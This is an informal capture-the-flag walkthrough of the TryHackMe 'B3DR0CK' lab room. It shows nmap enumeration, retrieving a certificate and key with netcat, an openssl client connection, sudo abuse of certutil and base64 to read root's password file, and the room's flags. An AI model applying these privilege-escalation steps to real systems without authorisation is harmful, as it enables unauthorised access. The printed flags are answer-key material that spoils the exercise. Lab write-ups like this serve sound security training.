B3DR0CK

$IP 10.10.159.2

scan IP by suing NMAP

nmap -sCV -vv $IP -oN nmap.txt

22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
9009/tcp open  pichat? syn-ack ttl 63
Discovered open port 54321/tcp on 10.10.159.2
Discovered open port 4040/tcp on 10.10.159.2




let hit 10.10.159.2 on web browser 
it redirect to the https://10.10.159.2:4040

wich contain

Welcome to ABC!

Abbadabba Broadcasting Compandy

We're in the process of building a website! Can you believe this technology exists in bedrock?!?

Barney is helping to setup the server, and he said this info was important...

Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...

let find the certificate on 9009 port 


sudo nc -v 10.10.159.2 9009
 search ssh key and certificate 

 save bothe file and use in 54321 to gain access 

use openssl

openssl s_clint -connect $IP -cert certificate -key key


i found the password hint 
d1ad7c0a3805955a35eb260dab4180dd for Barney Rubble





What is the barney.txt flag? 

THM{f05780f08f0eb1de65023069d0e4c90c}


What is fred's password?
 
 let jump into find the fred certificate and the key
 	sudo -l
 			User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil

 sudo /usr/bin/certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30 21:54 .
drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
-rw-r----- 1 root root  972 Sep  5 23:19 barney.certificate.pem
-rw-r----- 1 root root 1678 Sep  5 23:19 barney.clientKey.pem
-rw-r----- 1 root root  894 Sep  5 23:19 barney.csr.pem
-rw-r----- 1 root root 1674 Sep  5 23:19 barney.serviceKey.pem
-rw-r----- 1 root root  976 Sep  5 23:19 fred.certificate.pem
-rw-r----- 1 root root 1674 Sep  5 23:19 fred.clientKey.pem
-rw-r----- 1 root root  898 Sep  5 23:19 fred.csr.pem
-rw-r----- 1 root root 1674 Sep  5 23:19 fred.serviceKey.pem

sace the fret certificate.pem in tow file 

and sun openssl to see password hint 

Password hint: YabbaDabbaD0000! (user = 'fredcertificatepem')





What is the fred.txt flag?

THM{08da34e619da839b154521da7323559d}

What is the root.txt flag?

sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt

 sudo /usr/bin/base64 /root/pass.txt

TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dOQkdYVVJUTEpaS0ZTU1lLCg==


echo "TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dOQkdYVVJUTEpaS0ZTU1lLCg==" | base64 -d                    
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK

decode with base32

YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK


decode with base64

a00a12aad6b7c16bf07032bd05a31d56


its MD5 hase now decode by using online tools

flintstonesvitamins

lets use this password on root command 

cat /root/root.txt

THM{de4043c009214b56279982bf10a661b7}
